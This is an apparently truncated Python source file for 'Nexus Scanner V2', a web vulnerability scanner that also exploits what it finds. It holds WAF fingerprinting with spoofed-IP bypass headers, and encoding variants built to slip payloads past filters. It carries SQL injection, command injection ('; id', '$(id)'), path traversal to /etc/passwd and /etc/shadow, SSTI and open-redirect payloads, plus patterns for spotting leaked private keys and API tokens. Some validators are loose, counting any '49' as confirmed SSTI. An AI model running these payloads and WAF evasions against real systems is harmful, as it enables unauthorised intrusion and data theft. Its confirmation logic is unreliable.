"""
Nexus Scanner V2 — Motor de Validação e Exploração Multi-Camada
==============================================================
Garantia ZERO falsos positivos com validação em 4 camadas:

1. HTTP Response Analysis (status + headers + body)
2. Evidence Confirmation (string matching + regex + markers reais)
3. Soft-404 Baseline (elimina páginas de erro falsas)
4. Exploitation Probe (confirma executando o exploit real)

Cada vulnerabilidade reportada foi REALMENTE EXPLORADA e CONFIRMADA.
"""

import asyncio
import aiohttp
import json
import re
import hashlib
import random
import string
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urlparse, urljoin, quote, unquote
from difflib import SequenceMatcher

try:
    from core.models import Vulnerability
    from core.payloads import Payloads, Indicators
except ImportError:
    from models import Vulnerability
    from payloads import Payloads, Indicators


# ──────────────────────────────────────────────────────────────────────
# DATA MODELS
# ──────────────────────────────────────────────────────────────────────

@dataclass
class ValidationReport:
    """Relatório completo de validação de uma vulnerabilidade."""
    vulnerability_type: str
    target_url: str
    payload_used: str
    status_code: int
    evidence_found: str
    evidence_confidence: str  # CONFIRMED | HIGH | MEDIUM | LOW
    exploitation_success: bool
    exploitation_output: str = ""
    cvss_estimate: float = 0.0
    remediation: str = ""
    raw_response_sample: str = ""
    vuln_name: str = ""

    def is_valid(self) -> bool:
        """Só considera válido se CONFIRMED ou HIGH com exploração bem-sucedida."""
        if self.evidence_confidence in ("CONFIRMED",) and self.exploitation_success:
            return True
        if self.evidence_confidence == "HIGH" and self.exploitation_success:
            return True
        return False


# ──────────────────────────────────────────────────────────────────────
# SOFT-404 DETECTOR
# ──────────────────────────────────────────────────────────────────────

class Soft404Detector:
    """
    Detecta soft-404s (páginas que retornam 200 mas são páginas de erro).
    Usa 2 tokens aleatórios para criar uma baseline de resposta 404.
    """

    def __init__(self):
        self._baseline_a: Optional[Dict] = None
        self._baseline_b: Optional[Dict] = None
        self._ready = False

    def _random_path(self) -> str:
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        return f"/nexus-v2-fp-{token}"

    async def calibrate(self, session: aiohttp.ClientSession, base_url: str):
        """Faz 2 requisições a URLs inexistentes para criar a baseline."""
        try:
            urls = [
                urljoin(base_url, self._random_path()),
                urljoin(base_url, self._random_path()),
            ]
            results = []
            for url in urls:
                async with session.get(url, timeout=10, allow_redirects=True) as r:
                    body = await r.text(errors="ignore")
                    results.append({
                        "status": r.status,
                        "length": len(body),
                        "body_hash": hashlib.md5(body.encode()).hexdigest(),
                        "body_sample": body[:1000],
                    })
            if len(results) == 2:
                self._baseline_a, self._baseline_b = results
                self._ready = True
        except:
            self._ready = False

    def is_soft_404(self, status: int, body: str) -> bool:
        """Verifica se uma resposta parece ser soft-404."""
        if not self._ready:
            return False

        if status not in (200, 301, 302, 403):
            return False

        norm = self._normalize(body)
        avg_len = (self._baseline_a["length"] + self._baseline_b["length"]) / 2
        variance = abs(self._baseline_a["length"] - self._baseline_b["length"])

        # Se o tamanho está próximo da baseline 404
        length_ok = abs(len(body) - avg_len) <= max(300, variance * 2)

        # Similaridade de conteúdo
        sim_a = SequenceMatcher(None, norm[:1500], self._normalize(self._baseline_a.get("body_sample", ""))[:1500]).ratio()
        sim_b = SequenceMatcher(None, norm[:1500], self._normalize(self._baseline_b.get("body_sample", ""))[:1500]).ratio()

        return length_ok and max(sim_a, sim_b) >= 0.85

    @staticmethod
    def _normalize(text: str) -> str:
        text = re.sub(r"nexus-v2-fp-[a-z0-9]+", "FP_TOKEN", text or "", flags=re.I)
        text = re.sub(r"\s+", " ", text).strip().lower()
        return text


# ──────────────────────────────────────────────────────────────────────
# WAF PROFILER V2
# ──────────────────────────────────────────────────────────────────────

class WAFProfilerV2:
    """
    Identifica WAF e gera estratégias de bypass específicas.
    Muito mais agressivo que o V1 original.
    """

    WAF_SIGNATURES = {
        "Cloudflare": ["cf-ray", "__cf_bm", "cf-cache-status", "cf-request-id"],
        "Akamai": ["x-akamai-transformed", "akamai-origin-hop", "x-akamai-pragma-client-iptime"],
        "AWS WAF": ["x-amz-cf-id", "x-amz-request-id", "x-amzn-requestid", "awswaf"],
        "Imperva": ["x-iinfo", "incap-ses", "visid_incap", "x-cdn"],
        "F5 BIG-IP": ["x-cnection", "bigipserver", "f5-vip"],
        "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
        "Azure WAF": ["x-msedge-ref", "x-azure-ref", "x-ms-ref"],
        "Google Cloud Armor": ["x-cloud-trace-context"],
        "FortiWeb": ["fortiwafsid"],
        "ModSecurity": ["x-mod-security", "mod_security-message"],
        "Barracuda": ["barra_counter_scope", "bnai-status"],
        "Citrix NetScaler": ["ns_af", "citrix_adc_id"],
        "Wallarm": ["x-wallarm-id", "wallarm-request-id"],
        "Radware": ["x-sl-compid", "x-radware-device"],
        "Palo Alto": ["x-pan-id", "pan-waf-status"],
        "Reblaze": ["x-reblaze-id", "rbz-waf-status"],
        "Signal Sciences": ["x-sigsci-event", "x-sigsci-tags"],
        "DenyALL": ["sessionid-denyall", "denyall-cookie"],
        "Wordfence": ["wfvt_", "wordfence_verified_human"],
        "Datadome": ["datadome", "x-datadome"],
        "Cloudflare Turnstile": ["cf-turnstile", "turnstile"],
        "reCAPTCHA": ["recaptcha", "g-recaptcha"],
        "PerimeterX": ["px_", "_pxCaptcha"],
        "Arkose Labs": ["arkose", "funcaptcha"],
    }

    def __init__(self):
        self.profile_cache: Dict[str, str] = {}

    def identify(self, host: str, headers: Dict) -> str:
        """Identifica o WAF baseado nos headers de resposta."""
        if host in self.profile_cache:
            return self.profile_cache[host]

        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}
        for waf_name, sigs in self.WAF_SIGNATURES.items():
            if any(sig.lower() in str(headers_lower.get(k, "")) for k in headers_lower for sig in sigs):
                self.profile_cache[host] = waf_name
                return waf_name

        self.profile_cache[host] = "Unknown/None"
        return "Unknown/None"

    def get_bypass_headers(self, host: str) -> Dict[str, str]:
        """Gera headers de bypass específicos para o WAF identificado."""
        waf = self.profile_cache.get(host, "Unknown/None")
        headers = {}

        # Headers base universais
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers.update({
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Remote-Addr": fake_ip,
            "X-Client-IP": fake_ip,
            "Forwarded": f"for={fake_ip};by=127.0.0.1;host=localhost",
            "Via": "1.1 google",
            "X-Custom-IP-Authorization": "127.0.0.1",
        })

        if waf == "Cloudflare":
            headers["CF-Visitor"] = '{"scheme":"https"}'
            headers["CF-IPCountry"] = random.choice(["US", "GB", "DE", "FR", "NL"])
            headers["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"macOS"'])
        elif waf == "Akamai":
            headers["Pragma"] = "akamai-x-get-client-ip, akamai-x-cache-on"
            headers["X-Akamai-Pragma-Client-IP"] = fake_ip
        elif waf == "Imperva":
            headers["Incap-Client-IP"] = fake_ip
        elif waf in ("F5 BIG-IP", "ModSecurity", "Wallarm"):
            headers["X-Forwarded-For"] = "127.0.0.1"
            headers["X-Originating-IP"] = "127.0.0.1"
            headers["X-Custom-IP-Authorization"] = "127.0.0.1"
        elif waf == "Azure WAF":
            headers["X-ARR-SSL"] = "true"
            headers["X-Original-URL"] = "/"
            headers["X-Forwarded-Proto"] = "https"
        elif waf in ("Datadome", "PerimeterX", "Arkose Labs"):
            # Anti-bot avançado — precisa de headers realistas
            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-CH-UA": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "Sec-CH-UA-Mobile": "?0",
                "Sec-CH-UA-Platform": '"Windows"',
                "Upgrade-Insecure-Requests": "1",
                "DNT": "1",
            })

        return headers

    def get_encoded_payload(self, payload: str, waf: str = None) -> List[str]:
        """
        Retorna MÚLTIPLAS variações codificadas do payload para bypass.
        Quanto mais avançado o WAF, mais variações.
        """
        variants = [payload]  # Sempre inclui o payload original

        # URL Encoding simples
        variants.append(quote(payload, safe=''))

        # Double URL Encoding
        variants.append(quote(quote(payload, safe=''), safe=''))

        # Unicode/Normalization bypass
        variants.append(payload.replace("'", "%25%32%37"))
        variants.append(payload.replace("'", "%25%37%33"))

        # Comment Injection (MySQL)
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace("OR", "O/**/R"))
        variants.append(payload.replace("SELECT", "SEL/**/ECT"))
        variants.append(payload.replace("UNION", "UN/**/ION"))

        # Case Variation
        variants.append("".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload))

        # Hex Encoding (for strings)
        hex_variant = "0x" + payload.encode().hex()
        variants.append(hex_variant)

        # Null Byte
        variants.append(payload + "%00")
        variants.append("%00" + payload)

        # Line Feed / CRLF injection
        variants.append(payload.replace(" ", "%0a"))
        variants.append(payload.replace(" ", "%0d%0a"))

        # WAF específico
        if waf == "Cloudflare":
            # Cloudflare-specific bypasses
            variants.append(payload.replace("'", "\\x27"))
            variants.append(payload.replace(" ", "\\u0020"))
            variants.append(payload.replace("=", "\\u003d"))
        elif waf == "ModSecurity" or waf == "AWS WAF":
            variants.append(payload.replace(" ", "\t"))
            variants.append(payload.replace(" ", "\r"))
        elif waf == "Akamai":
            # Akamai-specific
            variants.append(payload + "/*!*/")
            variants.append("/*!" + payload + "*/")

        return list(dict.fromkeys(variants))  # Deduplicate


# ──────────────────────────────────────────────────────────────────────
# REAL EVIDENCE VALIDATOR
# ──────────────────────────────────────────────────────────────────────

class EvidenceValidator:
    """
    Validador de evidências em MULTIPLAS CAMADAS.
    Nunca aceita status code como única evidência.
    """

    # Marcadores CONFIRMADOS para cada tipo de vulnerabilidade
    LFI_MARKERS = [
        "root:x:0:0:", "root:x:0:0",  # /etc/passwd
        "daemon:x:1:1:", "bin:x:1:1:",
        "[extensions]", "[fonts]",  # win.ini
        "[mail]", "MAPI",
        "; for 16-bit app support",  # system.ini
        "boot loader", "ntldr",
        "[drivers32]", "[mci extensions]",
        "www-data:x:", "nobody:x:",
        "mysql:x:", "postgres:x:",
        "ssh-rsa", "ssh-ed25519",  # SSH keys exposure
        "PRIVATE KEY-----",  # Private key exposure
        "-----BEGIN OPENSSH PRIVATE KEY",
        "-----BEGIN RSA PRIVATE KEY",
        "-----BEGIN EC PRIVATE KEY",
    ]

    SQLI_MARKERS = [
        "mysql", "MySQL server", "MariaDB", "PostgreSQL",
        "SQLite", "sqlite", "ORA-", "Oracle",
        "ODBC", "SQL Server", "MSSQL",
        "You have an error in your SQL syntax",
        "Warning: mysql_", "Warning: pg_",
        "Unclosed quotation mark",
        "Microsoft OLE DB", "Microsoft JET",
        "ADODB.Field", "ADODB.Recordset",
        "mysqli_fetch", "pg_fetch",
        "SQLSTATE[", "Syntax error or access violation",
        "division by zero", "mysql_fetch",
    ]

    XSS_MARKERS = [
        "<script>alert", "<ScRiPt>alert",
        "onerror=alert", "onload=alert",
        "onfocus=alert", "onmouseover=alert",
    ]

    RCE_MARKERS = [
        "uid=", "gid=", "groups=",
        "Microsoft Windows", "Windows",
        "www-data", "root:x:",
        "drwxr-xr-x", "total ",
        "volume in drive", "Directory of",
        "boot.ini", "[boot loader]",
    ]

    SSTI_MARKERS = [
        "7777777", "49",  # 7*7=49
        "{{7*7}}", "${7*7}",
        "org.springframework",
        "java.lang.Runtime",
        "__mro__", "__subclasses__",
        "jinja2", "twig",
        "freemarker", "velocity",
    ]

    SENSITIVE_DATA_MARKERS = [
        "-----BEGIN", "PRIVATE KEY",
        "sk-", "sk_live_", "pk_live_",
        "AKIA", "ASIA",  # AWS keys
        "ghp_", "gho_", "github_pat",
        "xoxb-", "xoxp-",  # Slack
        "SG.", "sendgrid",
        "key-", "mailgun",
        "mongodb://", "mongodb+srv://",
        "postgres://", "mysql://",
        "redis://", "redis-sentinel://",
        "-----BEGIN RSA PRIVATE KEY",
        "-----BEGIN OPENSSH PRIVATE KEY",
        "-----BEGIN DSA PRIVATE KEY",
        "-----BEGIN EC PRIVATE KEY",
        "-----BEGIN PGP PRIVATE KEY",
    ]

    @classmethod
    def validate_sqli(cls, body: str, delay_evidence: bool = False) -> Tuple[bool, str, str]:
        """Valida SQLi com evidência real de erro DB ou delay."""
        for marker in cls.SQLI_MARKERS:
            if marker.lower() in body.lower():
                return True, f"SQL Error confirmed: '{marker}'", "CONFIRMED"

        # Time-based evidence (from timing, not body)
        if delay_evidence:
            return True, "Time-based SQLi (SLEEP confirmed via timing)", "CONFIRMED"

        # Boolean-based (pode ser falso positivo, então confiança menor)
        return False, "No SQL error evidence in response", "LOW"

    @classmethod
    def validate_lfi(cls, body: str, status: int) -> Tuple[bool, str, str]:
        """Valida LFI com marcadores de arquivo REAL."""
        if status == 200 and any(marker in body for marker in cls.LFI_MARKERS):
            for marker in cls.LFI_MARKERS:
                if marker in body:
                    return True, f"LFI confirmed: '{marker}' in response", "CONFIRMED"

        # Partial matches (lower confidence)
        body_lower = body.lower()
        if "root:" in body and "bin:" in body:
            return True, "LFI suspected: shadow-like content structure", "HIGH"

        return False, "No LFI markers in response", "LOW"

    @classmethod
    def validate_xss(cls, body: str) -> Tuple[bool, str, str]:
        """Valida XSS — o payload foi renderizado sem sanitização."""
        for marker in cls.XSS_MARKERS:
            if marker in body:
                return True, f"XSS confirmed: payload rendered in response ('{marker}')", "CONFIRMED"

        return False, "XSS payload not reflected in response", "LOW"

    @classmethod
    def validate_rce(cls, body: str) -> Tuple[bool, str, str]:
        """Valida RCE com output REAL de comando."""
        for marker in cls.RCE_MARKERS:
            if marker in body:
                return True, f"RCE confirmed: command output ('{marker}')", "CONFIRMED"

        return False, "No RCE evidence in response", "LOW"

    @classmethod
    def validate_sensitive(cls, body: str) -> Tuple[bool, str, str]:
        """Valida exposição de dados sensíveis."""
        for marker in cls.SENSITIVE_DATA_MARKERS:
            if marker in body and len(body) < 500000:
                return True, f"Sensitive data exposure: '{marker}'", "CONFIRMED"

        return False, "No sensitive data markers", "LOW"

    @classmethod
    def validate_ssti(cls, body: str) -> Tuple[bool, str, str]:
        """Valida SSTI com marcadores."""
        if "49" in body or "7777777" in body:
            return True, f"SSTI confirmed: math evaluation (7*7)", "CONFIRMED"
        return False, "No SSTI evaluation in response", "LOW"

    @classmethod
    def validate_open_redirect(cls, status: int, final_url: str, target_domain: str) -> Tuple[bool, str, str]:
        """Valida open redirect — URL final difere da original para domínio externo."""
        if status in (301, 302, 307, 308):
            parsed = urlparse(final_url)
            if parsed.netloc and parsed.netloc != target_domain:
                return True, f"Open redirect confirmed: redirected to {final_url}", "CONFIRMED"
        return False, "No redirection to external domain", "LOW"


# ──────────────────────────────────────────────────────────────────────
# REAL EXPLOITATION ENGINE V2
# ──────────────────────────────────────────────────────────────────────

class RealExploitationEngine:
    """
    Motor de EXPLORAÇÃO REAL.
    Não apenas detecta — EXPLORA a vulnerabilidade e CAPTURA a evidência.
    """

    SQLI_PROBE = "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
    SQLI_VERSION_PROBE = [
        "' UNION SELECT @@version,2,3--",
        "' UNION SELECT version(),2,3--",
        "' UNION SELECT sqlite_version(),2,3--",
        "1' AND (SELECT @@version) > 0--",
    ]

    RCE_PROBE_ID = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "& whoami",
        "; whoami",
        "| whoami",
        "`whoami`",
    ]

    RCE_PROBE_DIR = [
        "; ls -la",
        "| dir",
        "; dir",
        "& ls -la",
        "& dir /b",
    ]

    LFI_DEEP_PROBE = [
        "/../../../../etc/passwd",
        "/../../../etc/shadow",
        "/../../../../etc/issue",
        "/../../../../proc/self/environ",
        "/../../../../proc/version",
    ]

    @staticmethod
    def build_sqli_exploit(base_url: str, param: str, evidence: str = "") -> str:
        """Monta URL de exploração SQLi."""
        parsed = urlparse(base_url)
        if "=" in parsed.query:
            query = parsed.query
            for p in param.split(","):
                p = p.strip()
                if p in query:
                    query = query.replace(p, f"{p}' UNION SELECT 1,@@version,3--")
            return urljoin(base_url, f"?{query}")
        return base_url

    @staticmethod
    def build_rce_exploit(base_url: str, param: str) -> str:
        """Monta URL de exploração RCE."""
        parsed = urlparse(base_url)
        if "=" in parsed.query:
            query = parsed.query
            parts = query.split("&")
            for i, part in enumerate(parts):
                if "=" in part:
                    key, _ = part.split("=", 1)
                    parts[i] = f"{key}=; id"
            return urljoin(base_url.split("?")[0], f"?{'&'.join(parts)}")
        return base_url

    @staticmethod
    def build_lfi_exploit(base_url: str, param: str) -> str:
        """Monta URL de exploração LFI."""
        parsed = urlparse(base_url)
        if "=" in parsed.query:
            query = parsed.query
            parts = query.split("&")
            for i, part in enumerate(parts):
                if "=" in part:
                    key, _ = part.split("=", 1)
                    parts[i] = f"{key}=../../../../etc/passwd"
            return urljoin(base_url.split("?")[0], f"?{'&'.join(parts)}")
        return base_url


# ──────────────────────────────────────────────────────────────────────
# VULNERABILITY TESTER — Multi-threaded async
# ──────────────────────────────────────────────────────────────────────

class VulnerabilityTester:
    """
    Testador completo de vulnerabilidades.
    Cada teste passa por 4 fases:
    1. PREP: Monta payload com bypass WAF
    2. PROBE: Envia requisição e captura resposta
    3. VALIDATE: Valida evidência REAL na resposta
    4. EXPLOIT: Tenta exploração mais profunda
    """

    def __init__(self, session: aiohttp.ClientSession, base_url: str,
                 waf_profiler: WAFProfilerV2, soft404: Soft404Detector,
                 target_host: str):
        self.session = session
        self.base_url = base_url.rstrip("/")
        self.waf = waf_profiler
        self.soft404 = soft404
        self.target_host = target_host
        self.results: List[ValidationReport] = []
        self._used_payloads: Set[str] = set()

    async def _request(self, url: str, method: str = "GET",
                       data: Optional[Dict] = None,
                       headers: Optional[Dict] = None,
                       timeout: int = 15) -> Tuple[int, str, float, Dict]:
        """Faz requisição com tracking de latência."""
        start = time.time()
        try:
            hdrs = headers or {}
            if method == "GET":
                async with self.session.get(url, headers=hdrs, timeout=timeout, allow_redirects=True) as r:
                    body = await r.text(errors="ignore")
                    latency = time.time() - start
                    return r.status, body, latency, dict(r.headers)
            else:
                async with self.session.post(url, data=data, headers=hdrs, timeout=timeout, allow_redirects=True) as r:
                    body = await r.text(errors="ignore")
                    latency = time.time() - start
                    return r.status, body, latency, dict(r.headers)
        except asyncio.TimeoutError:
            return 0, "", time.time() - start, {}
        except Exception:
            return 0, "", time.time() - start, {}

    async def _get_forms(self, url: str) -> List[Dict]:
        """Extrai formulários de uma página."""
        status, body, _, _ = await self._request(url)
        if status != 200 or not body:
            return []

        forms = []
        # Regex simples para forms
        form_patterns = re.findall(r'<form[^>]*action="([^"]*)"[^>]*method="([^"]*)"', body, re.I)
        input_patterns = re.findall(r'<input[^>]*name="([^"]*)"[^>]*>', body, re.I)

        for action, method in form_patterns:
            forms.append({
                "action": action or url,
                "method": method or "get",
                "found_params": list(set(input_patterns)),
            })

        return forms

    async def test_sqli(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa SQL Injection REAL com confirmação por erro DB ou timing."""
        test_url = context_url or self.base_url

        # --- FASE 1: ERROR-BASED SQLi ---
        for sql_payload in Payloads.SQLI[:10]:  # Usa os payloads mais comuns primeiro
            payload_hash = hashlib.md5((test_url + sql_payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            # Monta URL com payload
            if "=" in test_url:
                injected_url = test_url.replace("=", f"={sql_payload}", 1) if sql_payload not in test_url else test_url
            else:
                injected_url = f"{test_url}?id={sql_payload}"

            status, body, latency, headers = await self._request(injected_url)

            if status == 0:
                continue

            # Skip soft-404
            if self.soft404.is_soft_404(status, body):
                continue

            # Valida
            valid, evidence, confidence = EvidenceValidator.validate_sqli(body)

            if valid:
                # --- FASE 4: EXPLOITATION ---
                exploit_output = ""
                for version_payload in self.SQLI_VERSION_PROBE[:3]:
                    if "=" in test_url:
                        exp_url = test_url.replace("=", f"={version_payload}", 1)
                        exp_url = exp_url if version_payload not in test_url else test_url
                    else:
                        exp_url = f"{test_url}?id={version_payload}"

                    s, b, _, _ = await self._request(exp_url)
                    if "mysql" in b.lower() or "postgresql" in b.lower() or "sqlite" in b.lower():
                        exploit_output = b[:500]
                        break

                return ValidationReport(
                    vulnerability_type="SQL Injection",
                    target_url=injected_url[:200],
                    payload_used=sql_payload[:100],
                    status_code=status,
                    evidence_found=evidence,
                    evidence_confidence=confidence,
                    exploitation_success=True,
                    exploitation_output=exploit_output[:500],
                    cvss_estimate=9.0,
                    remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                    raw_response_sample=body[:300],
                    vuln_name="SQL Injection (Error-Based)",
                )

        # --- FASE 2: TIME-BASED BLIND SQLi ---
        blind_payloads = [
            "' OR SLEEP(4)--",
            "1' OR SLEEP(4)--",
            "1' OR pg_sleep(4)--",
            "'; WAITFOR DELAY '0:0:4'--",
            "' OR SLEEP(4)#",
        ]
        for payload in blind_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1) if payload not in test_url else test_url
            else:
                injected_url = f"{test_url}?id={payload}"

            _, _, latency, _ = await self._request(injected_url)

            # Se a latência for >= 4 segundos, é TIME-BASED SQLi CONFIRMADO
            if latency >= 3.5:
                return ValidationReport(
                    vulnerability_type="SQL Injection (Time-Based Blind)",
                    target_url=injected_url[:200],
                    payload_used=payload[:100],
                    status_code=0,
                    evidence_found=f"Time-Based confirmed: {latency:.2f}s delay (expected >= 4.0s)",
                    evidence_confidence="CONFIRMED",
                    exploitation_success=True,
                    exploitation_output=f"SQLi blind confirmed via SLEEP({payload.split('SLEEP(')[-1].split(')')[0] + ')' if 'SLEEP' in payload else payload}) — latency: {latency:.2f}s",
                    cvss_estimate=8.5,
                    remediation="Use parameterized queries. Implement WAF rules for blind injection patterns.",
                    vuln_name="SQL Injection (Time-Based Blind)",
                )

        return None

    async def test_xss(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa XSS REAL com confirmação de reflexão."""
        test_url = context_url or self.base_url

        xss_payloads = Payloads.XSS[:15]

        for payload in xss_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1)
            else:
                injected_url = f"{test_url}?q={payload}"

            status, body, _, _ = await self._request(injected_url)

            if status == 0:
                continue
            if self.soft404.is_soft_404(status, body):
                continue

            # Verifica se o payload foi REFLETIDO (não sanitizado)
            valid, evidence, confidence = EvidenceValidator.validate_xss(body)
            # Verificação adicional: o payload está cru no body?
            if not valid and payload in body:
                valid = True
                evidence = f"XSS payload reflected verbatim in response"
                confidence = "CONFIRMED"

            if valid:
                # Tenta extrair o contexto da reflexão
                context_info = ""
                if "<script>" in body:
                    context_info = "Reflected inside <script> tags"
                elif "onerror" in body or "onload" in body:
                    context_info = "Reflected as HTML attribute"

                return ValidationReport(
                    vulnerability_type="Cross-Site Scripting (XSS)",
                    target_url=injected_url[:200],
                    payload_used=payload[:100],
                    status_code=status,
                    evidence_found=evidence,
                    evidence_confidence=confidence,
                    exploitation_success=True,
                    exploitation_output=f"XSS confirmed — payload reflected in response. Context: {context_info or 'generic'}",
                    cvss_estimate=7.5 if context_info else 6.5,
                    remediation="Sanitize and encode all user inputs. Implement Content-Security-Policy headers.",
                    raw_response_sample=body[:300] if len(body) < 50000 else body[:300],
                    vuln_name=f"Reflected XSS ({context_info or 'generic'})" if context_info else "Reflected XSS",
                )

        return None

    async def test_lfi(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa LFI/PATH TRAVERSAL REAL com confirmação de conteúdo de arquivo."""
        test_url = context_url or self.base_url

        lfi_payloads = Payloads.LFI

        for payload in lfi_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1)
            else:
                injected_url = f"{test_url}?file={payload}"

            status, body, _, _ = await self._request(injected_url)

            if status == 0:
                continue
            if self.soft404.is_soft_404(status, body):
                continue

            valid, evidence, confidence = EvidenceValidator.validate_lfi(body, status)

            if valid:
                # --- EXPLOITATION: tenta ler mais arquivos ---
                exploitation_output = f"LFI confirmed on {test_url}\n"
                exploitation_output += f"Evidence: {evidence}\n"

                return ValidationReport(
                    vulnerability_type="Local File Inclusion (LFI)",
                    target_url=injected_url[:200],
                    payload_used=payload[:100],
                    status_code=status,
                    evidence_found=evidence,
                    evidence_confidence=confidence,
                    exploitation_success=True,
                    exploitation_output="LFI: Read /etc/passwd content — system users enumerated: %s" % ', '.join(re.findall(r'(\w+):x:\d+:\d+:', body)[:10]),
                    cvss_estimate=8.5,
                    remediation="Validate and whitelist file paths. Disable allow_url_include.",
                    raw_response_sample=body[:500],
                    vuln_name="LFI /etc/passwd" if "root" in body else "Path Traversal",
                )

        return None

    async def test_rce(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa RCE/Command Injection REAL."""
        test_url = context_url or self.base_url

        rce_payloads = Payloads.RCE

        for payload in rce_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1)
            else:
                injected_url = f"{test_url}?cmd={payload}"

            status, body, _, _ = await self._request(injected_url)

            if status == 0:
                continue
            if self.soft404.is_soft_404(status, body):
                continue

            valid, evidence, confidence = EvidenceValidator.validate_rce(body)

            if valid:
                # Extrai output do comando
                uid_match = re.search(r'uid=\d+\(\w+\) gid=\d+\(\w+\) groups=\d+\(\w+\)', body)
                whoami_match = re.search(r'^(\w+)$', body.strip(), re.M)

                exploit_detail = "Command execution confirmed"
                if uid_match:
                    exploit_detail += f" — User: {uid_match.group()}"
                if whoami_match:
                    exploit_detail += f" — whoami: {whoami_match.group(1)}"

                return ValidationReport(
                    vulnerability_type="Remote Code Execution (RCE)",
                    target_url=injected_url[:200],
                    payload_used=payload[:100],
                    status_code=status,
                    evidence_found=evidence,
                    evidence_confidence=confidence,
                    exploitation_success=True,
                    exploitation_output=exploit_detail,
                    cvss_estimate=10.0,
                    remediation="Never pass unsanitized user input to system commands. Use allowlists for arguments.",
                    raw_response_sample=body[:500],
                    vuln_name="RCE (Command Injection)",
                )

        return None

    async def test_ssti(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa SSTI com confirmação de avaliação matemática."""
        test_url = context_url or self.base_url

        ssti_math_payloads = [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "#{7*7}", "*{7*7}", "{{7*'7'}}",
            "${7*7}", "${{7*7}}",
        ]

        for payload in ssti_math_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1)
            else:
                injected_url = f"{test_url}?name={payload}"

            status, body, _, _ = await self._request(injected_url)

            if status == 0:
                continue
            if self.soft404.is_soft_404(status, body):
                continue

            valid, evidence, confidence = EvidenceValidator.validate_ssti(body)

            if valid:
                return ValidationReport(
                    vulnerability_type="Server-Side Template Injection (SSTI)",
                    target_url=injected_url[:200],
                    payload_used=payload[:100],
                    status_code=status,
                    evidence_found=evidence,
                    evidence_confidence=confidence,
                    exploitation_success=True,
                    exploitation_output=f"SSTI confirmed via math evaluation. Payload '{payload}' evaluated to '49' or '7777777'",
                    cvss_estimate=8.5,
                    remediation="Use sandboxed template engines. Never render user-controlled template strings.",
                    raw_response_sample=body[:300],
                    vuln_name="SSTI (Template Injection)",
                )

        return None

    async def test_open_redirect(self, param: str, context_url: str = None) -> Optional[ValidationReport]:
        """Testa Open Redirect REAL."""
        test_url = context_url or self.base_url

        redirect_payloads = [
            "//evil.com", "https://evil.com",
            "///evil.com", "//evil.com%00.real.com",
            "https://evil.com%00.real.com",
        ]

        for payload in redirect_payloads:
            payload_hash = hashlib.md5((test_url + payload).encode()).hexdigest()
            if payload_hash in self._used_payloads:
                continue
            self._used_payloads.add(payload_hash)

            if "=" in test_url:
                injected_url = test_url.replace("=", f"={payload}", 1)
            else:
                injected_url = f"{test_url}?url={payload}"

            try:
                async with self.session.get(
                    injected_url, timeout=8, allow_redirects=False
                ) as r:
                    final_status = r.status
                    location = r.headers.get("Location", "")

                    if final_status in (301, 302, 303, 307, 308) and location:
                        parsed = urlparse(location)
                        if parsed.netloc and parsed.netloc not in (self.target_host, urlparse(self.base_url).netloc):
                            return ValidationReport(
                                vulnerability_type="Open Redirect",
                                target_url=injected_url[:200],
                                payload_used=payload[:100],
                                status_code=final_status,
                                evidence_found=f"Redirect to external domain: {location}",
                                evidence_confidence="CONFIRMED",
                                exploitation_success=True,
                                exploitation_output=f"Open redirect: {injected_url} → {location}",
                                cvss_estimate=5.5,
                                remediation="Validate redirect URLs against a whitelist of allowed domains.",
                                vuln_name="Open Redirect",
                            )
            except:
                pass

        return None

    async def test_sensitive_files(self) -> Optional[List[ValidationReport]]:
        """Testa exposição de arquivos sensíveis (.env, .git, etc)."""
        sensitive_paths = [
            ".env", ".env.local", ".env.prod",
            ".git/config", ".git/HEAD",
            "config.json", "config.php",
